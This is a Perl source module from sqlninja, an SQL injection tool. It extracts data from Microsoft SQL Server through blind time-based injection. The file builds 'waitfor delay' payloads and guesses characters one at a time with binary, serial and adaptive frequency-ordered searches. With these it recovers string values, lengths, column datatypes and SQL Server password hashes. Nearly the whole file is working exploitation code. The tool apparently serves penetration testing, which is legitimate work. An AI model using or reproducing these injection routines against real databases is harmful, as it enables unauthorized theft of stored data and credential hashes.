# This file is part of sqlninja
# Copyright (C) 2006-2013
# http://sqlninja.sourceforge.net
# icesurfer <r00t@northernfortress.net>
# nico <nico@leidecker.info>
# 
# Sqlninja is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Sqlninja is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with sqlninja. If not, see <http://www.gnu.org/licenses/>.

use strict;
our $conf;

my @char_map = (); 

# universal weight map (does not need to be amended)
my @weight_map = (0) x 256;


# load the map file and the weights
sub setup_module
{
	# load map from file
	# let's see if the map was stored in the session:
	my ($session_map_file, $updated) = session_load_property(SESSION_PROPERTY_LANGUAGE_MAP_FILE);
	my $map = "";

	if ($session_map_file ne $conf->{'language_map'}) {
		# load from file
		print "loading map  from " . $conf->{'language_map'} . "\n";
		open MAP_FILE, $conf->{'language_map'} or die "could not load map file: $!\n";
		binmode MAP_FILE;
		$map = <MAP_FILE>;
		# store info in session
		session_store_property_unique(SESSION_PROPERTY_LANGUAGE_MAP_FILE, $conf->{'language_map'});
		session_store_property_unique(SESSION_PROPERTY_LANGUAGE_MAP, $map);
		session_store_property_unique(SESSION_PROPERTY_LANGUAGE_MAP_WEIGHTS, join(',', @weight_map));
	} else {
		# get map and weights from session
		print "loading map from session file\n";
		my ($loaded_map, $updated) = session_load_property(SESSION_PROPERTY_LANGUAGE_MAP);
		$map = $loaded_map;
		my ($session_weights, $updated) = session_load_property(SESSION_PROPERTY_LANGUAGE_MAP_WEIGHTS);
		@weight_map = split(/,/,$session_weights);
	}

	@char_map = split(//,$map);
}

sub shutdown_module 
{
	# don't do anything
}

sub extract_string
{
	my $inner_query_string = $_[0]; # The query to execute to extract the string
	my $inner_query_len = $_[1]; # The query to execute to extract its length (if needed)
	my $minlen = $_[2]; # Minimum length, usually 0
 	my $maxlen = $_[3]; # Max length
	my $output = $_[4]; # Boolean: whether to output stuff during extraction
	my $description = $_[5]; # Description of the string (only if $output == 1)

	my $len = extract_number($inner_query_len, $minlen, $maxlen, $output, $description);

	my $string = extract_string_priv($inner_query_string, $len, $output, $description);


    # update map in session
	session_store_property_unique(SESSION_PROPERTY_LANGUAGE_MAP, join('',@char_map));
	session_store_property_unique(SESSION_PROPERTY_LANGUAGE_MAP_WEIGHTS, join(',', @weight_map));

	return $string;
}

sub sanity_check
{
	my $query = shift;
	
	if ($conf->{'sanity_check'}) {
		if (!confirm_result($query)) {
			print_verbose("Sanity check failed!\n");
			return 0;
		}
		
		print_verbose("Sanity check passed!\n");
	}
	return 1;
}


sub confirm_result
{
	my $query = shift;
	
	my $delay = tryblind($query);
	if ($delay > $conf->{'blindtime'} - 2) {
		# has changed
		return 0;
	}

	# has not changed
	return 1;
}

sub refresh_data
{
	my ($updated, $query) = @_;

	if ($conf->{'refresh_session'}) {
		print "    (last updated: $updated)\n";
		my $answer = read_from_prompt("    Do you want to update this information? (y|n)", '[yn]');
		if ($answer eq 'y') {
			if ($query ne "") {
				if (confirm_result($query) == 0) {
					print "   Information changed. Will enumerate again...\n";
					return 1;
				} else {
					print "    Information up-to-date.\n";
				}
			} else {
				print "    Refreshing...\n";
				return 1;
			}
		}
	}

	return 0;
}

# TODO: extracting numbers will always be binary? I.e. how in the serial weighted approach? (nico)
# Return a number, "null" if fails
sub extract_number
{
	my $inner_query = $_[0]; # The query to execute
	my $min = $_[1]; # Minimum number to try
	my $max = $_[2]; # Maximum number to try 
	my $showoutput = $_[3]; # 0: Don't show output. 1: show output 2: show more output
	my $desc = $_[4]; # Just a description
	
	my $len = -1;
	my $candidate;
	my $query;
	my $delay;

	local $/=\1;
	local $|=1;
	
	if ($showoutput == 2) {
		print "[+] Finding length of ".$desc." ... \n";
	}
	
	if ($conf->{'extractiontype'} eq "binary") {
		my $len1 = "if (".$inner_query.") < ";
		my $len2 = " waitfor delay '0:0:".$conf->{'blindtime'}."';";
		while ($len < 0) {
			$candidate = int(($min+$max)/2);
			$query = $len1.$candidate.$len2;
			$delay = tryblind($query);
			if (($max - $min) > 1) {
				if ($delay < $conf->{'blindtime'} - 2) {
					$min = $candidate;
				} else {
					$max = $candidate; #
				}
				if ($min == $max) {
					$len = $min;
				}
			} else {
				if ($delay < $conf->{'blindtime'} - 2) {
					$len = $max-1;
				} else {
					$len = $min;
				}
			}
		}
	} else {
		my $len1 = "if (".$inner_query.") = ";
		my $len2 = " waitfor delay '0:0:".$conf->{'blindtime'}."';";
		$candidate = $min;
		while (($len<0) and ($candidate <= $max)) {
			$query = $len1.$candidate.$len2;
			$delay = tryblind($query);
			if ($delay > $conf->{'blindtime'} -2) {
				$len = $candidate;
			}
			$candidate++;
		}
	}
	if ($showoutput == 2) {
		print "  Got it! Result = ".$len."\n";
	}
	return $len;
}

# Extract a string from the DB
sub extract_string_priv
{
	my $inner_query = $_[0]; # The query to execute 
	my $len = $_[1]; # The length of the string to extract
        my $showoutput = $_[2];
	my $desc = $_[3]; # Some description
	
	my $candidate;
	my $query;
	my $delay;

	local $/=\1;
	local $|=1;

	
	if ($showoutput > 0) {
		print "  ".$desc." = ";
	}
	my $asciinum = -1;
	my $charnum;
	my $minchar;
	my $maxchar;
	my $result = "";
	my $printable_result = "";

	my $total_guesses = 0;

	# used if selected serial_optimized and fallback to serial is required.
	my $serial_fallback = 0;

	for ($charnum=1; $charnum<=$len; $charnum++) {

		# showing fancy progress bar
		if ($showoutput == 0) {
			show_progress($charnum, $len);
		}

		$minchar=0;
		$maxchar=255;

		# binary search
		if ($conf->{'extractiontype'} eq "binary") {

			while ($asciinum < 0) {
				$candidate = int(($minchar+$maxchar)/2);

				$query = "if ascii(substring((" . $inner_query . ")," . $charnum . ",1)) < " . $candidate 
								. " waitfor delay '0:0:".$conf->{'blindtime'}."';";


				$total_guesses++;
				$delay = tryblind($query);
				if (($maxchar-$minchar) > 1) {
					if ($delay < $conf->{'blindtime'} - 2) {
						$minchar=$candidate;
					} else {	
						$maxchar=$candidate;
					}
					if ($minchar==$maxchar) {
						$asciinum=$minchar;
					}
				} else {
					if ($delay < $conf->{'blindtime'} - 2) {
						$asciinum=$maxchar-1;
					} else {
						$asciinum=$minchar;
					}
				}
			}

		# serial search
		} elsif ($conf->{'extractiontype'} eq "serial" or $serial_fallback)  {

			$candidate = $minchar;

			# skip a serial character (only used if this is a fallback run from serial_optimized)
			my $skip = 0;
			while (($asciinum < 0) and ($candidate <= $maxchar)) {

				$skip = 0;
				# fall back run from serial_optimized
				if ($serial_fallback) {
					# make sure character is not in charmap
					foreach (@char_map) {
						if (lc(chr($candidate)) eq $_) {
							# character in map, skip this character
							$skip = 1;
							last;
						}
					}
				}

				if (!$skip) { 
					$query = "if ascii(substring((" . $inner_query . ")," . $charnum . ",1)) = " . $candidate 
									. " waitfor delay '0:0:".$conf->{'blindtime'}."';";

					$delay = tryblind($query);

					$total_guesses++;
					if ($delay > $conf->{'blindtime'} - 2) {
						$asciinum = $candidate;

						# if this was a fallback run from serial_optimized, add the newly discovered char to the map
						if ($serial_fallback) {
							$serial_fallback = 0;	# make sure we continue with serial_optimized
							push(@char_map, chr($candidate));
						}
					}
				}
				$candidate++;
			}

		# optimized serial approach
		} else {
		    #cycle through char map
		    for (my $char_idx = 0; ($char_idx < scalar @char_map) && ($asciinum < 0); $char_idx++) {	

		    	$candidate = ord(@char_map[$char_idx]);

		    	#TODO: converting characters to lower case here. ATM not possible to enumerate upper case chars (nico)
		    	$query = "if ascii(lower(substring((" . $inner_query . ")," . $charnum . ",1))) = " . $candidate
							. " waitfor delay '0:0:".$conf->{'blindtime'}."';";

				$delay = tryblind($query);

				$total_guesses++;
				if ($delay > $conf->{'blindtime'} - 2) {
					$asciinum = $candidate;
					if ($conf->{'language_map_adaptive'} == 1) {
						update_weight_map($char_idx);
					}
				}
		    }

		    if ($asciinum < 0) {
		    	# fall back to serial if character is not in map
				# print "falling back to serial\n"; <-- this breaks nice strings in data extractions!! :P
		    	$serial_fallback = 1;
		    	redo;
		    }

		}

		# convert result into readable character
		$result .= chr($asciinum);
		if ($showoutput > 0) {
			if (chr($asciinum) =~ /\P{IsC}/) {
#				$printable_result .= chr($asciinum);

				printf("%c",$asciinum);
			} else {
				print color 'yellow';
				printf("\\x%02x",$asciinum);
				print color 'reset';
#				$printable_result .= "{$asciinum}";
			}
#			print "$printable_result";
		}	
		$asciinum=-1;
	}

	# remove fancy progress bar
	if ($showoutput == 0) {
		clear_progress();
	} else {
		print "\n";
	}

#	print_verbose "Guesses: $total_guesses\n";
	return $result;
}

sub extract_hash {
	my ($query, $len) = @_;

	my @char_map = qw/0 1 2 3 4 5 6 7 8 9 a b c d e f/;

	# sql server hashes start with 0x0100. We can skip that part
	my $hash = "0x0100";

	local $|=1;
	for (my $char_idx = 7; $char_idx <= $len; $char_idx++) {

		# check if is not null
		my $check_null_query = "if (($query) IS NULL) waitfor delay '0:0:".$conf->{'blindtime'}."';";
		my $delay = tryblind($check_null_query);
		if ($delay > $conf->{'blindtime'} - 2) {
			return "";
		}

		# extract hash
		show_progress($char_idx, $len);
		foreach my $char (@char_map) {
			my $candidate = ord($char);
			my $run_query = "if ascii(substring(($query),$char_idx,1))=$candidate waitfor delay '0:0:".$conf->{'blindtime'}."';";

			my $delay = tryblind($run_query);
			if ($delay > $conf->{'blindtime'} - 2) {
					$hash .= chr($candidate);
					last;
			}
		}
		clear_progress();
	}

	if (length($hash) < $len) {
		$hash = "";
	}

	return $hash;
}

# update weight map. Used for serial_optimized
sub update_weight_map {
    my $char_idx = shift;

    @weight_map[ord(@char_map[$char_idx])]++;
    
    # check if updating the weight moves character forward in char map
    my $this_weight = @weight_map[ord(@char_map[$char_idx])];
    # iterate through characters 'in front' of current character
    for (my $pos = $char_idx; $pos > 0; $pos--) {
        if ($pos - 1 >= 0) {
            if (@weight_map[ord(@char_map[$pos - 1])] < $this_weight) {
                # if found a character with less weight, swap characters
                my $tmp = @char_map[$pos];
                @char_map[$pos] = @char_map[$pos - 1];
                @char_map[$pos - 1] = $tmp;
            }
        }
    }
}

# Given a DB, a table and a column name, tries to determine its type
sub extract_datatype
{
	my ($column, $table, $database) = @_;

	my $query;

	if ($database ne "") {
		$database .= "..";
	}

	my @datatypes = ("varchar", "nvarchar", "char", "nchar", "binary",
			 "int", "bigint", "bit", "decimal", "date",
			 "text", "money", "numeric", "smallint", "smallmoney",
			 "tinyint", "real", "float", "datetime2",
			 "datetime", "datetimeoffset", "smalldatetime",
			 "time", "ntext", "image", "varbinary", "cursor",
			 "timestamp", "hierarchyid", "uniqueidentifier",
			 "sql_variant", "xml", "table", "sysname",
			 "tinyint identity", "bigint identity", 
			 "numeric() identity", "decimal() identity", "NULL");	
	my $delay = 0;
	my $i = -1;
	while (($delay < ($conf->{'blindtime'} - 2)) and ($i < @datatypes)) {
		$i++;		 
	     	$query = "if ((select type_name(".$database."syscolumns.xtype) ".
			 "from ".$database."syscolumns, ".$database."sysobjects ".
			 "WHERE ".$database."syscolumns.id=".$database."sysobjects.id ".
			 "AND ".$database."sysobjects.name='".$table."' ".
			 "and ".$database."syscolumns.name = '".$column."') = '".$datatypes[$i]."') waitfor delay '0:0:".$conf->{'blindtime'}."';";

		$delay = tryblind($query);
	}
	if ($i < @datatypes) {
		 return $datatypes[$i];
	} else { 
	      	return "unknown";
	}
}


1;